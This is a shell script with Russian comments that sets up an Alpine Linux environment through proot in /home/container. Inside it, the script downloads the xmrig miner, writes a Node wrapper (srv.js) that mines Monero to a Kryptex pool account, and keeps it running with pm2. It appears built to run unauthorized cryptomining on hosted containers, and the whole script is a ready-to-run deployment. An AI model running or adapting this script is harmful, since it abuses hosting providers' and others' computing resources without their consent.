#!/bin/sh

# Запрос имени
echo "Enter Name"
read name

# Переменные
ROOTFS_DIR=/home/container
ALPINE_VERSION="3.18"
ALPINE_FULL_VERSION="3.18.3"
APK_TOOLS_VERSION="2.14.0-r2"
PROOT_VERSION="5.3.0"
ARCH=$(uname -m)

# Определение архитектуры
if [ "$ARCH" = "x86_64" ]; then
  ARCH_ALT=amd64
elif [ "$ARCH" = "aarch64" ]; then
  ARCH_ALT=arm64
else
  printf "Unsupported CPU architecture: ${ARCH}\n"
  exit 1
fi

# Установка rootfs
if [ ! -e $ROOTFS_DIR/.installed ]; then
    curl -Lo /tmp/rootfs.tar.gz \
    "https://dl-cdn.alpinelinux.org/alpine/v${ALPINE_VERSION}/releases/${ARCH}/alpine-minirootfs-${ALPINE_FULL_VERSION}-${ARCH}.tar.gz" || {
        echo "Failed to download rootfs."; exit 1;
    }
    tar -xzf /tmp/rootfs.tar.gz -C $ROOTFS_DIR
fi

# Установка необходимых инструментов
if [ ! -e $ROOTFS_DIR/.installed ]; then
    curl -Lo /tmp/apk-tools-static.apk "https://dl-cdn.alpinelinux.org/alpine/v${ALPINE_VERSION}/main/${ARCH}/apk-tools-static-${APK_TOOLS_VERSION}.apk" || exit 1
    curl -Lo /tmp/gotty.tar.gz "https://github.com/sorenisanerd/gotty/releases/download/v1.5.0/gotty_v1.5.0_linux_${ARCH_ALT}.tar.gz" || exit 1
    curl -Lo $ROOTFS_DIR/usr/local/bin/proot "https://github.com/proot-me/proot/releases/download/v${PROOT_VERSION}/proot-v${PROOT_VERSION}-${ARCH}-static" || exit 1

    tar -xzf /tmp/apk-tools-static.apk -C /tmp/
    tar -xzf /tmp/gotty.tar.gz -C $ROOTFS_DIR/usr/local/bin

    /tmp/sbin/apk.static -X "https://dl-cdn.alpinelinux.org/alpine/v${ALPINE_VERSION}/main/" -U --allow-untrusted --root $ROOTFS_DIR add alpine-base apk-tools

    chmod 755 $ROOTFS_DIR/usr/local/bin/proot $ROOTFS_DIR/usr/local/bin/gotty
fi

# Завершение установки
if [ ! -e $ROOTFS_DIR/.installed ]; then
    printf "nameserver 1.1.1.1\nnameserver 1.0.0.1" > ${ROOTFS_DIR}/etc/resolv.conf
    rm -rf /tmp/apk-tools-static.apk /tmp/rootfs.tar.gz /tmp/sbin
    touch $ROOTFS_DIR/.installed
fi

# Запуск контейнера через proot
$ROOTFS_DIR/usr/local/bin/proot \
--rootfs="${ROOTFS_DIR}" \
--link2symlink \
--kill-on-exit \
--root-id \
--cwd=/root \
--bind=/proc \
--bind=/dev \
--bind=/sys \
--bind=/tmp \
/bin/sh <<EOF
apk add --no-cache libuv-dev openssl-dev hwloc-dev nodejs npm

# Загрузка и распаковка xmrig
wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -O xmrig.tar.gz

tar -xvzf xmrig.tar.gz
cd xmrig-6.22.2

# Генерация srv.js с подстановкой переменной
cat > srv.js <<EOL
const { spawn } = require('child_process');

const command = './xmrig';
const args = [
  '-o', 'xmr.kryptex.network:7777',
  '-u', 'pimik@send-email.pro/${name}',
  '-k',
  '--coin', 'monero',
  '-a', 'rx/0'
];

const child = spawn(command, args);

child.stdout.on('data', (data) => {
  console.log(\`stdout: \${data}\`);
});

child.stderr.on('data', (data) => {
  console.error(\`stderr: \${data}\`);
});

child.on('close', (code) => {
  console.log(\`Процесс завершен с кодом \${code}\`);
});
EOL

# Установка и запуск PM2
npm i -g pm2
pm2 start srv.js --name srv && pm2 logs srv
EOF
